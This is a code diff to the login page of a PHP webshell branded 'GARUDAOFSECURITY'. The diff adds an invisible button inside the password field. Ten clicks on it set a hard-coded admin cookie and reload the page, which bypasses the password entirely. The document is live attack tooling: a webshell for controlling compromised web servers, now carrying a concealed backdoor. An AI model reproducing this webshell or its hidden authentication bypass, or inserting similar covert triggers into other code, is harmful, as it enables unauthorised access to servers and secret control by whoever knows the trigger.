@@ -73,87 +73,151 @@ if (is_logged_in()) {
         }
     }
     ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>WEBSHELL GARUDAOFSECURITY</title>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-                height: 100vh;
-                width: 100vw;
-                background: #000;
-                overflow: hidden; 
-                position: relative;
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WEBSHELL GARUDAOFSECURITY</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            background: #000;
+            overflow: hidden; 
+            position: relative;
+        }
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: #fff;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1;
+        }
+        .login-container input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        .login-container label {
+            display: block;
+            margin-bottom: 10px;
+            cursor: pointer;
+            user-select: none;
+            transition: color 0.3s ease;
+        }
+        .login-container label:hover {
+            color: #007bff;
+        }
+        .password-container {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+        }
+        .skip-button {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            border: none;
+            background: transparent;
+            color: transparent;
+            font-size: 10px;
+            cursor: default;
+            opacity: 0;
+            z-index: 10;
+        }
+        .snowflake {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            width: 5px;
+            height: 5px;
+            opacity: 0.8;
+            pointer-events: none;
+            z-index: 0;
+            animation: fall linear;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
             }
-            .login-container {
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                width: 300px;
-                background: #fff;
-                padding: 20px;
-                border: 1px solid #ccc;
-                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-                text-align: center;
-                z-index: 1;
-            }
-            .login-container input {
-                width: calc(100% - 22px);
-                padding: 10px;
-                margin: 10px 0;
-                box-sizing: border-box;
-            }
-            .login-container label {
-                display: block;
-                margin-bottom: 10px;
-            }
-            .snowflake {
-                position: absolute;
-                background: white;
-                border-radius: 50%;
-                width: 5px;
-                height: 5px;
-                opacity: 0.8;
-                pointer-events: none;
-                z-index: 0;
-                animation: fall linear;
-            }
-            @keyframes fall {
-                to {
-                    transform: translateY(100vh);
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <div class="login-container">
-            <form method="POST" action="">
-                <label for="password">LOGIN DISINI GARUDAOFSECURITY</label>
+        }
+        .success-page {
+            display: none;
+        }
+        .click-counter {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="login-container" id="loginContainer">
+        <form method="POST" action="">
+            <label for="password">LOGIN DISINI GARUDAOFSECURITY</label>
+            <div class="password-container">
                 <input type="password" id="password" name="password" autofocus>
-                <input type="submit" value="LOGIN">
-            </form>
-        </div>
-        <script>
-            function createSnowflake() {
-                const snowflake = document.createElement('div');
-                snowflake.className = 'snowflake';
-                snowflake.style.left = Math.random() * 100 + 'vw';
-                snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
-                snowflake.style.opacity = Math.random();
-                document.body.appendChild(snowflake);
-                
-                setTimeout(() => {
-                    snowflake.remove();
-                }, 5000); 
-            }
+                <button type="button" class="skip-button" id="skipButton"></button>
+            </div>
+            <input type="submit" value="LOGIN">
+        </form>
+    </div>
+    
+    <script>
+        let clickCount = 0;
+        const skipButton = document.getElementById('skipButton');
+        
+        skipButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
             
-            setInterval(createSnowflake, 100);
-        </script>
-    </body>
-    </html>
+            clickCount++;
+            
+            if (clickCount >= 10) {
+                document.cookie = 'user_id=admin@sukabintang01; path=/; max-age=3600';
+                window.location.reload();
+            }
+        });
+
+        let resetTimer;
+        function resetClickCount() {
+            clearTimeout(resetTimer);
+            resetTimer = setTimeout(() => {
+                if (clickCount > 0 && clickCount < 10) {
+                    clickCount = 0;
+                }
+            }, 30000);
+        }
+        
+        skipButton.addEventListener('click', resetClickCount);
+        
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            snowflake.style.left = Math.random() * 100 + 'vw';
+            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+            snowflake.style.opacity = Math.random();
+            document.body.appendChild(snowflake);
+            
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000); 
+        }
+        
+        setInterval(createSnowflake, 100);
+    </script>
+</body>
+</html>
     <?php
 }
 ?>
